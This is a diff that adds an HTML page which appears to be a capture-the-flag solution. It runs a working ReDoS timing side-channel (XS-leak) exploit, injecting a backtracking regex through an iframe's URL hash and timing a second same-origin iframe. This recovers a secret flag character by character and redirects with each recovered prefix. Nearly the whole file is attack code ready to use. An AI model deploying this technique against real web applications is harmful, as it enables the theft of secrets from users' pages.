@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body></body>
+<iframe id="frame" src="index.html#"></iframe>
+<script>
+
+frame.onload = async () => {
+    const urlParams = new URLSearchParams(window.location.search);
+    let flag = urlParams.get('flag') || "flag{";
+    
+    function test(flag) {
+        // Trigger onhashchange event, this regex will be parsed and executed.
+        frame.src = "index.html#" + `^(?=${flag}).*.*.*.*.*.*.*.*.*something`;
+
+        // Create new iframe with the "same origin" to trigger busy event loop
+        // This iframe will be on the same thread with the previous iframe.
+        let newFrame = document.createElement('iframe');
+        newFrame.src = "index.html#";
+        document.body.append(newFrame);
+        let start = performance.now();
+        return new Promise(resolve => {
+            setTimeout(() => {
+                resolve(true);
+                newFrame.remove();
+            }, 100);
+
+            // We can measure the timing execution of the regex by waiting the newFrame to load
+            newFrame.onload = () => {
+                console.log(performance.now() - start, flag);
+                resolve(false);
+                newFrame.remove();
+            }
+        });
+    }
+
+    const alphabet = 'abcdefghijklmnopqrstuvwxyz_}';
+    // Bruteforce the flag character by character
+    for (let c of alphabet) {
+        let ok = await test(flag + c);
+        console.log(flag + c, ok);
+        if (ok) {
+            location.replace("hack.html?flag=" + flag + c);
+            break;
+        }
+    }
+};
+</script>
+
+</html>
